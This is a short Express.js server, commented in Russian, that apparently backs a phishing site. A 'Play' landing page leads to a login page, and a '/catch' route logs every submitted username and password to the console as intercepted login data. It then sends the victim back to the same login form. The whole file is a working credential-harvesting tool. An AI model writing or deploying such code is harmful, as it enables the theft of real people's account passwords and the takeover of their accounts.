const express = require('express');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

// Главная страница с кнопкой Играть
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Переход на страницу логина
app.get('/login.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

// Обработчик формы
app.post('/catch', (req, res) => {
    const login = req.body.username;
    const pass = req.body.password;

    console.log('\n==============================');
    console.log('[ПОЛУЧЕНЫ ДАННЫЕ ВХОДА]');
    console.log(`Логин (Имя пользователя): ${login}`);
    console.log(`Пароль: ${pass}`);
    console.log('==============================');

    // Отправляем обратно на страницу логина после перехвата
    res.sendFile(path.join(__dirname, 'login.html'));
});

app.listen(PORT, () => {
    console.log(`=== СЕРВЕР РАБОТАЕТ НА ПОРТУ ${PORT} ===`);
});
